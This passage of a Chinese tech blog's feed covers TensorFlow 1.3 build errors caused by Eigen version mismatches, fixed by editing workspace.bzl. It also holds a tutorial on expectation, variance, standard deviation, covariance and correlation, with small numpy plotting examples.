n::Matrix&amp;lt;std::complex&amp;lt;float&amp;gt;, -1, -1&amp;gt;, 0, Eigen::Stride&amp;lt;0, 0&amp;gt; &amp;gt;, -1, 1, true&amp;gt;; OtherScalar = float]&#39;:
external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:297:40:   required from &#39;void Eigen::MatrixBase&amp;lt;Derived&amp;gt;::applyOnTheRight(Eigen::Index, Eigen::Index, const Eigen::JacobiRotation&amp;lt;OtherScalar&amp;gt;
&amp;amp;) [with OtherScalar = float; Derived = Eigen::Map&amp;lt;Eigen::Matrix&amp;lt;std::complex&amp;lt;float&amp;gt;, -1, -1&amp;gt;, 0, Eigen::Stride&amp;lt;0, 0&amp;gt; &amp;gt;; Eigen::Index = long int]&#39;
external/eigen_archive/Eigen/src/Eigenvalues/SelfAdjointEigenSolver.h:861:7:   required from &#39;void Eigen::internal::tridiagonal_qr_step(RealScalar*, RealScalar*, Index, Index, Scalar*, Index)
 [with int StorageOrder = 0; RealScalar = float; Scalar = std::complex&amp;lt;float&amp;gt;; Index = long int]&#39;
external/eigen_archive/Eigen/src/Eigenvalues/SelfAdjointEigenSolver.h:520:87:   required from &#39;Eigen::ComputationInfo Eigen::internal::computeFromTridiagonal_impl(DiagType&amp;amp;, SubDiagType&amp;amp;, Eig
en::Index, bool, MatrixType&amp;amp;) [with MatrixType = Eigen::Matrix&amp;lt;std::complex&amp;lt;float&amp;gt;, -1, -1&amp;gt;; DiagType = Eigen::Matrix&amp;lt;float, -1, 1&amp;gt;; SubDiagType = Eigen::Matrix&amp;lt;float, -1, 1&amp;gt;; Eigen::Index =
long int]&#39;

....

external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:386:35: error: &#39;struct Eigen::internal::conj_helper&amp;lt;__vector(4) float, Eigen::internal::Packet2cf, false, false&amp;gt;&#39; has no member named &#39;pmul&#39;
external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:415:22: error: &#39;struct Eigen::internal::conj_helper&amp;lt;__vector(4) float, Eigen::internal::Packet2cf, false, false&amp;gt;&#39; has no member named &#39;pmul&#39;
       pstore(px, padd(pm.pmul(pc,xi),pcj.pmul(ps,yi)));
                      ^
external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:415:22: error: &#39;struct Eigen::internal::conj_helper&amp;lt;__vector(4) float, Eigen::internal::Packet2cf, false, false&amp;gt;&#39; has no member named &#39;pmul&#39;
external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:416:22: error: &#39;struct Eigen::internal::conj_helper&amp;lt;__vector(4) float, Eigen::internal::Packet2cf, false, false&amp;gt;&#39; has no member named &#39;pmul&#39;
       pstore(py, psub(pcj.pmul(pc,yi),pm.pmul(ps,xi)));
                      ^
external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:416:22: error: &#39;struct Eigen::internal::conj_helper&amp;lt;__vector(4) float, Eigen::internal::Packet2cf, false, false&amp;gt;&#39; has no member named &#39;pmul&#39;
Target //tensorflow/tools/pip_package:build_pip_package failed to build
Use --verbose_failures to see the command lines of failed build steps.
INFO: Elapsed time: 2366.425s, Critical Path: 2221.96s
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;错误2-tensorflowcorelibcorethreadpoolcc-nonblockingthreadpooltempl参数错误&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%94%99%e8%af%af2-tensorflowcorelibcorethreadpoolcc-nonblockingthreadpooltempl%e5%8f%82%e6%95%b0%e9%94%99%e8%af%af&#34;&gt;
        #
    &lt;/a&gt;
    错误2: tensorflow/core/lib/core/threadpool.cc NonBlockingThreadPoolTempl()参数错误
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ERROR: /home/nvidia/tensorflow/tensorflow-1.3.0/tensorflow/core/BUILD:1244:1: C++ compilation of rule &#39;//tensorflow/core:lib_internal&#39; failed: crosstool_wrapper_driver_is_not_gcc failed: error executing command external/              local_config_cuda/crosstool/clang/bin/crosstool_wrapper_driver_is_not_gcc -U_FORTIFY_SOURCE &#39;-D_FORTIFY_SOURCE=1&#39; -fstack-protector -fPIE -Wall -Wunused-but-set-parameter ... (remaining 115 argument(s) skipped): com.google.devtools.build.lib.shell.BadExitStatusException: Process exited with status 1.
tensorflow/core/lib/core/threadpool.cc: In constructor &#39;tensorflow::thread::ThreadPool::Impl::Impl(tensorflow::Env*, const tensorflow::ThreadOptions&amp;amp;, const string&amp;amp;, int, bool)&#39;:
tensorflow/core/lib/core/threadpool.cc:91:56: error: no matching function for call to &#39;Eigen::NonBlockingThreadPoolTempl&amp;lt;tensorflow::thread::EigenEnvironment&amp;gt;::NonBlockingThreadPoolTempl(int&amp;amp;, bool&amp;amp;, tensorflow::thread::              EigenEnvironment)&#39;
             EigenEnvironment(env, thread_options, name)) {}
                                                        ^
In file included from external/eigen_archive/unsupported/Eigen/CXX11/ThreadPool:58:0,
                 from external/eigen_archive/unsupported/Eigen/CXX11/Tensor:72,
                 from ./third_party/eigen3/unsupported/Eigen/CXX11/Tensor:1,
                 from tensorflow/core/lib/core/threadpool.cc:19:
external/eigen_archive/unsupported/Eigen/CXX11/src/ThreadPool/NonBlockingThreadPool.h:22:3: note: candidate: Eigen::NonBlockingThreadPoolTempl&amp;lt;Environment&amp;gt;::NonBlockingThreadPoolTempl(int, Environment) [with Environment = tensorflow::thread::EigenEnvironment]
   NonBlockingThreadPoolTempl(int num_threads, Environment env = Environment())
   ^
external/eigen_archive/unsupported/Eigen/CXX11/src/ThreadPool/NonBlockingThreadPool.h:22:3: note:   candidate expects 2 arguments, 3 provided
Target //tensorflow/tools/pip_package:build_pip_package failed to build
Use --verbose_failures to see the command lines of failed build steps.
INFO: Elapsed time: 292.433s, Critical Path: 68.80s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解决方法是使用正确版本的eigen，其中“问题一”是用v3.3.4的eigen可以解决，“问题二”需要使用最新的eigen：&lt;/p&gt;
&lt;p&gt;修复的方法是编辑&amp;quot;tensorflow/workspace.bzl&amp;quot;，并指定最新的eigen：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  native.new_http_archive(
      name = &amp;quot;eigen_archive&amp;quot;,
      #urls = [
      #    &amp;quot;http://mirror.bazel.build/bitbucket.org/eigen/eigen/get/f3a22f35b044.tar.gz&amp;quot;,
      #    &amp;quot;https://bitbucket.org/eigen/eigen/get/f3a22f35b044.tar.gz&amp;quot;,
      #],
      #sha256 = &amp;quot;ca7beac153d4059c02c8fc59816c82d54ea47fe58365e8aded4082ded0b820c4&amp;quot;,
      #strip_prefix = &amp;quot;eigen-eigen-f3a22f35b044&amp;quot;,
      urls = [
          &amp;quot;https://bitbucket.org/eigen/eigen/get/tip.tar.gz&amp;quot;,
      ],
      sha256 = &amp;quot;6fe7af8244ab5d9c314a26bc8615adc61269896cfd66f1ae2cce3d6ee91a5b88&amp;quot;,
      strip_prefix = &amp;quot;eigen-eigen-034fba127699&amp;quot;,
      build_file = str(Label(&amp;quot;//third_party:eigen.BUILD&amp;quot;)),
  )
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中“sha256”和“strip_prefix”需要根据新的eigen修正。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>数学期望、方差、标准差、协方差</title>
      <link>/2017/09/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E6%96%B9%E5%B7%AE%E6%A0%87%E5%87%86%E5%B7%AE%E5%8D%8F%E6%96%B9%E5%B7%AE/</link>
      <pubDate>Wed, 06 Sep 2017 18:51:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/09/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E6%96%B9%E5%B7%AE%E6%A0%87%E5%87%86%E5%B7%AE%E5%8D%8F%E6%96%B9%E5%B7%AE/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;最近在学习机器学习的过程中发现了许多上学时在概率论和统计学课上学过的知识点，可是年代久远已经都忘记了，重新学起来还是费了不少力气，不过因为带着目的学习所以也有了一些新的认识。&lt;/p&gt;
&lt;h2 id=&#34;数学期望mean&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%95%b0%e5%ad%a6%e6%9c%9f%e6%9c%9bmean&#34;&gt;
        #
    &lt;/a&gt;
    数学期望（mean）
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;概率论中描述一个随机事件中的随机变量的平均值的大小可以使用“数学期望”（mean）这个概念。&lt;/p&gt;
&lt;p&gt;数学期望的定义是实验中每次可能的结果的概率乘以其结果的总和。&lt;/p&gt;
&lt;h3 id=&#34;离散型随机量的数学期望&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a6%bb%e6%95%a3%e5%9e%8b%e9%9a%8f%e6%9c%ba%e9%87%8f%e7%9a%84%e6%95%b0%e5%ad%a6%e6%9c%9f%e6%9c%9b&#34;&gt;
        ##
    &lt;/a&gt;
    离散型随机量的数学期望
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义：离散型随机变量的所有可能取值 $ x_i $  与其对应的概率 $ P( x_i ) $ 乘积的和为该离散型随机量的数学期望，记为 $ E(X) $。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;公式：&lt;/p&gt;
$$ E(X) = \sum_{i=1}^n x_i P_i$$
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;连续型随机量的数学期望&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%bf%9e%e7%bb%ad%e5%9e%8b%e9%9a%8f%e6%9c%ba%e9%87%8f%e7%9a%84%e6%95%b0%e5%ad%a6%e6%9c%9f%e6%9c%9b&#34;&gt;
        ##
    &lt;/a&gt;
    连续型随机量的数学期望
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义：假设连续型随机变量 $ X $ 的概率密度函数为 $ f(x) $ ，如果积分 $ \int_{-\infty}^{+\infty} xf(x) ,{\rm d}x $ 绝对收敛，则称这个积分的值为连续型随机量的数学期望，记为 $ E(X) $。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;公式：&lt;/p&gt;
$$ E(X) = \int_{-\infty}^{+\infty} xf(x) \,{\rm d}x $$
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数学期望的性质&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%95%b0%e5%ad%a6%e6%9c%9f%e6%9c%9b%e7%9a%84%e6%80%a7%e8%b4%a8&#34;&gt;
        ##
    &lt;/a&gt;
    数学期望的性质
&lt;/div&gt;
&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;设C为常数： $ E(C) = C $&lt;/li&gt;
&lt;li&gt;设C为常数： $ E(CX) = CE(X) $&lt;/li&gt;
&lt;li&gt;加法：$ E(X+Y) = E(X) + E(Y) $&lt;/li&gt;
&lt;li&gt;当X和Y相互独立时，$ E(XY) = E(X)E(Y) $ （主意，X和Y的相互独立性可以通过下面的“协方差”描述）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数学期望的意义&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%95%b0%e5%ad%a6%e6%9c%9f%e6%9c%9b%e7%9a%84%e6%84%8f%e4%b9%89&#34;&gt;
        ##
    &lt;/a&gt;
    数学期望的意义
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;根据根据“大数定律”的描述，这个数字的意义是指随着重复次数接近无穷大时，数值的算术平均值几乎肯定收敛于数学期望值，也就是说数学期望值可以用于预测一个随机事件的平均预期情况。&lt;/p&gt;
&lt;h2 id=&#34;均值&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%9d%87%e5%80%bc&#34;&gt;
        #
    &lt;/a&gt;
    均值
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;在往下面的内容走之前说一个简单的概念“均值”，就是平均数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义： 给定一个包含n个样本的集合 X={X1, &amp;hellip;Xn}，均值就是这个集合中所有元素和的平均值。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;公式： $ \overline X = {{\sum_{i=1}^n X_i } \over {n}} $&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;方差variance&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%96%b9%e5%b7%aevariance&#34;&gt;
        #
    &lt;/a&gt;
    方差(Variance)
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;方差是在概率论和统计方差衡量随机变量或一组数据时离散程度的度量，换句话说如果想知道一组数据之间的分散程度的话就可以使用“方差”来表示了。&lt;/p&gt;
&lt;p&gt;方差有两个定义，一个是统计学的定义，一个是概率论的定义。&lt;/p&gt;
&lt;h3 id=&#34;统计学方差&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bb%9f%e8%ae%a1%e5%ad%a6%e6%96%b9%e5%b7%ae&#34;&gt;
        ##
    &lt;/a&gt;
    统计学方差
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义：在统计描述中，方差用来计算每一个变量（观察值）与总体均数之间的差异。为避免出现离均差总和为零，离均差平方和受样本含量的影响，统计学采用平均离均差平方和来描述变量的变异程度。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;公式：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
$$ \sigma^2 = {\sum_{i=1}^N(X-\mu)^2 \over N} $$
&lt;p&gt;其中 $ \sigma^2 $ 为总体方差，X为变量，$ \mu $ 为整体均值， N为总体例数。&lt;/p&gt;
&lt;h4 id=&#34;样本方差&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a0%b7%e6%9c%ac%e6%96%b9%e5%b7%ae&#34;&gt;
        ###
    &lt;/a&gt;
    样本方差
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;由于在实际环境里是没有办法穷举所有例子，所以只能找出部分的样本数据，基于这部分样本进行测算。那么可以把公式转换成：&lt;/p&gt;
$$ S^2 = {{\sum_{i=1}^n(X_i - \overline X)}^2 \over (n - 1)} $$
&lt;p&gt;其中 $ S^2 $ 为样本方差， $ \overline X $ 是采集样本的均值，$ n $ 为样本的个数。&lt;/p&gt;
&lt;h3 id=&#34;概率论方差&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a6%82%e7%8e%87%e8%ae%ba%e6%96%b9%e5%b7%ae&#34;&gt;
        ##
    &lt;/a&gt;
    概率论方差
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;在概率分布中，设X是一个离散型随机变量&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义：在概率分布中，设X是一个离散型随机变量，若 $ E((X-E(X))^2) $ 存在，则称 $ E((X-E(X))^2) $ 为X的方差，记为 $ D(X) $ , $ Var(X) $ 或 $ DX $，其中 $ E(X) $ 是X的期望值，X是变量值，公式中的 $ E $ 是期望值expected value的缩写，意为“变量值与其期望值之差的平方和”的期望值。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;离散型随机变量方差计算公式：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
$$ D(X) = E((X-E(X))^2) = E(X^2) - (E(X))^2 $$
&lt;ul&gt;
&lt;li&gt;连续性变量X，若其定义域为 $ (a,b) $，概率密度函数为 $ f(x) $，连续型随机变量X方差计算公式：&lt;/li&gt;
&lt;/ul&gt;
$$ D(X) = \int_a^b (x - \mu)^2f(x) \,{\rm d}x $$
&lt;h3 id=&#34;方差的意义&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%96%b9%e5%b7%ae%e7%9a%84%e6%84%8f%e4%b9%89&#34;&gt;
        ##
    &lt;/a&gt;
    方差的意义
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;那么什么是分散程度呢？举个例子，比如说两个人在游乐场里玩射击游戏时打出了n发子弹，这些子弹有写离靶心近一些，有的远一些，但统计下来这两个人的得分可能相同，这时候如何区分这两个人的水平高低呢？比较直观的一个想法就是看谁的射击弹着点比较集中啦。&lt;/p&gt;
&lt;h2 id=&#34;标准差standard-deviation&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a0%87%e5%87%86%e5%b7%aestandard-deviation&#34;&gt;
        #
    &lt;/a&gt;
    标准差（Standard Deviation）
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义：又叫均方差，是离均差平方的算术平均数的平方根，用$ \sigma $ 表示。标准差是&amp;quot;方差&amp;quot;的算术平方根。标准差能反映一个数据集的离散程度。平均数相同的两组数据，标准差未必相同。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;公式：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
$$ \sigma = \sqrt 方差 = \sqrt {\sum_{i=1}^N(X-\mu)^2 \over N} $$
&lt;h3 id=&#34;样本标准差&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a0%b7%e6%9c%ac%e6%a0%87%e5%87%86%e5%b7%ae&#34;&gt;
        ##
    &lt;/a&gt;
    样本标准差
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;类似样本方差，在实际情况中很难知道所有的情况只能靠抽样来估算实际的标准差。&lt;/p&gt;
$$ S = \sqrt 样本方差 = \sqrt {{{\sum_{i=1}^n(X_i - \overline X)}^2 \over (n - 1)}} $$
&lt;h3 id=&#34;意义&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%84%8f%e4%b9%89&#34;&gt;
        ##
    &lt;/a&gt;
    意义
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;标准差和方差一样都是用于衡量样本的离散程度的量，那么为什么要有标准差呢？因为方差和样本的“量纲”不一样，换句话说不在一个层次。怎么理解这个层次呢，从公式看方差是样本与均值的差的平方和的平均，这里有一个平方运算，这是导致量纲不在同一个层次的原因。&lt;/p&gt;
&lt;p&gt;比如两个集合 $ [0，8，12，20] $ 和 $ [8，9，11，12] $ ，两个集合的均值都是10，两个集合的方差分别是：69.33和3.33；计算两者的标准差分别是：8.3和1.8。数字越大代表越离散，从数值上看方差和标准差的量纲差别就很明显了，而标准差更好的在量纲上与样本集合保持同步。这就是“标准”的意义了。&lt;/p&gt;
&lt;h2 id=&#34;协方差covariance&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8d%8f%e6%96%b9%e5%b7%aecovariance&#34;&gt;
        #
    &lt;/a&gt;
    协方差（Covariance）
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;前面的方差／标准差描述的是一维数据集合的离散程度，但世界上的现象普遍是多维度数据描述的。那么很自然就会想知道现象和数据的相关程度，以及各维度数据间的相关程度。&lt;/p&gt;
&lt;p&gt;比如，一个产品卖的好不好可能有很多因素构成，比如产品质量、价格等。那么是否质量和价格之间有相关性呢？这个问题就可以用协方差来解决。&lt;/p&gt;
&lt;h3 id=&#34;概率论协方差&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a6%82%e7%8e%87%e8%ae%ba%e5%8d%8f%e6%96%b9%e5%b7%ae&#34;&gt;
        ##
    &lt;/a&gt;
    概率论协方差
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;公式：期望值分别为 $ E(X) $ 和 $ E(Y) $ 的两个变量X和Y的协方差为：&lt;/li&gt;
&lt;/ul&gt;
$$ Cov(X,Y) = E[(X-E(X))(Y-E(Y))] $$
$$ = E(XY)- 2E(X)E(Y) + E(X)E(Y) $$
$$ = E(XY)- E(X)E(Y) $$
&lt;p&gt;协方差表示的是两个变量的总体的误差，这与只表示一个变量误差的方差不同。如果两个变量的变化趋势一致，也就是说如果其中一个大于自身的期望值，另外一个也大于自身的期望值，那么两个变量之间的协方差就是正值。 如果两个变量的变化趋势相反，即其中一个大于自身的期望值，另外一个却小于自身的期望值，那么两个变量之间的协方差就是负值。&lt;/p&gt;
&lt;p&gt;如果X 与Y 是统计独立的，那么二者之间的协方差就是0，则：&lt;/p&gt;
&lt;p&gt;$ E(XY) = E(X)E(Y) $&lt;/p&gt;
&lt;h3 id=&#34;统计学样本协方差&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bb%9f%e8%ae%a1%e5%ad%a6%e6%a0%b7%e6%9c%ac%e5%8d%8f%e6%96%b9%e5%b7%ae&#34;&gt;
        ##
    &lt;/a&gt;
    统计学样本协方差
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;对于包含两个随机变量关系的统计量，我们可以仿照方差的定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;公式：&lt;/li&gt;
&lt;/ul&gt;
$$ cov(X,Y) = {{\sum_{i=1}^n (X_i - \overline X)(Y_i - \overline Y)} \over (n-1)} $$
&lt;p&gt;注：从协方差公式可以看出“方差”是协方差在 $ Y=X $ 时的特殊情况。&lt;/p&gt;
&lt;h3 id=&#34;协方差性质&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8d%8f%e6%96%b9%e5%b7%ae%e6%80%a7%e8%b4%a8&#34;&gt;
        ##
    &lt;/a&gt;
    协方差性质
&lt;/div&gt;
&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;同一个变量的协方差等于其方差：$ Cov(X, X) = Var(X) $&lt;/li&gt;
&lt;li&gt;$ Cov(aX, bY) = ab Cov(X, Y) $ (a, b为常量)&lt;/li&gt;
&lt;li&gt;$ Cov(X_1 + X_2, Y) = Cov(X_1, Y) + Cov(X_2, Y) $&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;相关系数-correlation&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%9b%b8%e5%85%b3%e7%b3%bb%e6%95%b0-correlation&#34;&gt;
        #
    &lt;/a&gt;
    相关系数 (Correlation）
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;协方差作为描述X和Y相关程度的量，在同一物理量纲之下有一定的作用，但同样的两个量采用不同的量纲使它们的协方差在数值上表现出很大的差异。为此引入如下概念：&lt;/p&gt;
$$ \eta = Corr(X, Y) = {Cov(X, Y) \over \sqrt {Var(X) \cdot Var(Y)} }$$
&lt;h3 id=&#34;相关关系&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%9b%b8%e5%85%b3%e5%85%b3%e7%b3%bb&#34;&gt;
        ##
    &lt;/a&gt;
    相关关系
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;相关性是一个衡量线性独立的无量纲数，其取值在 $ [-1,+1] $ 之间。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;相关性 η = 1时称为“完全线性相关”，此时将 $ Y_i $ 对 $ X_i $作Y-X 散点图，将得到一组精确置換在直线上的点；相关性数值介于－1到1之间时，其绝对值越接近1表明线性相关性越好，作散点图得到的点的排布越接近一条直线。&lt;/li&gt;
&lt;li&gt;相关性 η = －1时称为“完全线性负相关”，作图与 η = －1类似也在一条直线上，但方向不同。&lt;/li&gt;
&lt;li&gt;相关性 η = 0时两个随机变量又被称为是不相关，“线性无关”、“线性不相关”，这仅仅表明X 与Y 两随机变量之间没有线性相关性，并非表示它们之间一定没有任何内在的（非线性）函数关系&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;协方差矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8d%8f%e6%96%b9%e5%b7%ae%e7%9f%a9%e9%98%b5&#34;&gt;
        #
    &lt;/a&gt;
    协方差矩阵
&lt;/div&gt;
&lt;/h2&gt;
&lt;div&gt;
$$ C_{nxn} = (C_{i,j}, C_{i,j} = Cov(Dim_i, Dim_j)) $$
&lt;/div&gt;
&lt;p&gt;假设数据集有{x, y, z}三个维度，那么其协方差矩阵为：&lt;/p&gt;
&lt;div&gt;
$$
\left[
\begin{matrix}
Cov(X,X) &amp; Cov(X,Y) &amp; Cov(X,Z) \\
Cov(Y,X) &amp; Cov(Y,Y) &amp; Cov(Y,Z) \\
Cov(Z,X) &amp; Cov(Z,Y) &amp; Cov(Z,Z)
\end{matrix}
\right]
=
\left[
\begin{matrix}
Var(X) &amp; Cov(X,Y) &amp; Cov(X,Z) \\
Cov(Y,X) &amp; Var(Y) &amp; Cov(Y,Z) \\
Cov(Z,X) &amp; Cov(Z,Y) &amp; Var(Z)
\end{matrix}
\right]
$$
&lt;/div&gt;
&lt;p&gt;其中:&lt;/p&gt;
$$ Cov(X,X) = Var(X) $$
$$ Cov(Y,Y) = Var(Y) $$
$$ Cov(Z,Z) = Var(Z) $$
&lt;p&gt;可以看出来协方差矩阵有几个特点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对角线上每个元素的值为方差&lt;/li&gt;
&lt;li&gt;协方差矩阵是对称矩阵&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;怎么理解协方差矩阵的意义呢？假设我们在做一项数据分析，每一项数据包含若干指标，那么协方差矩阵的对角线上的每一项可以告诉我们收集数据的分散程度，其它项综合起来可以用前面的相关性方程 $ \eta = Corr(X, Y) = {Cov(X, Y) \over \sqrt {Var(X) \cdot Var(Y)} }$ 计算出指标间的相互影响关系。&lt;/p&gt;
&lt;h3 id=&#34;正相关&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%ad%a3%e7%9b%b8%e5%85%b3&#34;&gt;
        ##
    &lt;/a&gt;
    正相关：
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;import numpy as np
import matplotlib.pyplot as plt

x, y = np.random.multivariate_normal([0, 0], [[1, 0.9], [0.9, 1]], 1000).T
plt.plot(x, y, &#39;x&#39;)
plt.axis(&#39;equal&#39;)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/covariance/correlated_positive.png&#34; alt=&#34;正相关&#34;&gt;&lt;/p&gt;
&lt;p&gt;从图中可以看出来x和y之间的关系是一个变大的同时另一个也变大，这说明x和y是正相关，$ \eta = Corr(X, Y) = {Cov(X, Y) \over \sqrt {Var(X) \cdot Var(Y)} } = { 0.9 \over \sqrt {1*1}} = 0.9 &amp;gt; 0 $ 也说明了这一点。&lt;/p&gt;
&lt;p&gt;指标x的方差$ Cov(x,x) = 1 $和y的方差 $ Cov(y,y) = 1 $说明数据分散不太严重，这一点可以从数据点分散的坐标范围看出来。&lt;/p&gt;
&lt;h3 id=&#34;分散正相关&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%86%e6%95%a3%e6%ad%a3%e7%9b%b8%e5%85%b3&#34;&gt;
        ##
    &lt;/a&gt;
    分散正相关
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;import numpy as np
import matplotlib.pyplot as plt

x, y = np.random.multivariate_normal([0, 0], [[5, 4.9], [4.9, 5]], 1000).T
plt.plot(x, y, &#39;x&#39;)
plt.axis(&#39;equal&#39;)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/covariance/correlated_positive_sparse.png&#34; alt=&#34;稀疏正相关&#34;&gt;&lt;/p&gt;
&lt;p&gt;从图中可以看出来x和y之间正相关，并且$ \eta = Corr(X, Y) = {Cov(X, Y) \over \sqrt {Var(X) \cdot Var(Y)} } = { 4.9 \over \sqrt {5*5}} = 0.98 &amp;gt; 0 $ 也说明了这一点。&lt;/p&gt;
&lt;p&gt;指标x的方差$ Cov(x,x) = 5 $和y的方差 $ Cov(y,y) = 5 $说明数据分散性比前面的例子大了，数据点分散的坐标范围比前面的大了。&lt;/p&gt;
&lt;h3 id=&#34;分散负相关&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%86%e6%95%a3%e8%b4%9f%e7%9b%b8%e5%85%b3&#34;&gt;
        ##
    &lt;/a&gt;
    分散负相关：
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;import numpy as np
import matplotlib.pyplot as plt

x, y = np.random.multivariate_normal([0, 0], [[5, -4.9], [-4.9, 5]], 1000).T
plt.plot(x, y, &#39;x&#39;)
plt.axis(&#39;equal&#39;)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/covariance/correlated_negative_sparse.png&#34; alt=&#34;悉数负相关&#34;&gt;&lt;/p&gt;
&lt;p&gt;从图中可以看出来x和y之间负相关，并且$ \eta = Corr(X, Y) = {Cov(X, Y) \over \sqrt {Var(X) \cdot Var(Y)} } = { -4.9 \over \sqrt {5*5}} = -0.98 &amp;lt; 0 $ 也说明了这一点。&lt;/p&gt;
&lt;p&gt;指标x的方差$ Cov(x,x) = 5 $和y的方差 $ Cov(y,y) = 5 $说明数据分散性比前面的例子大了，数据点分散的坐标范围比前面的大了。&lt;/p&gt;
&lt;h3 id=&#34;分散不相关&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%86%e6%95%a3%e4%b8%8d%e7%9b%b8%e5%85%b3&#34;&gt;
        ##
    &lt;/a&gt;
    分散不相关：
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;import numpy as np
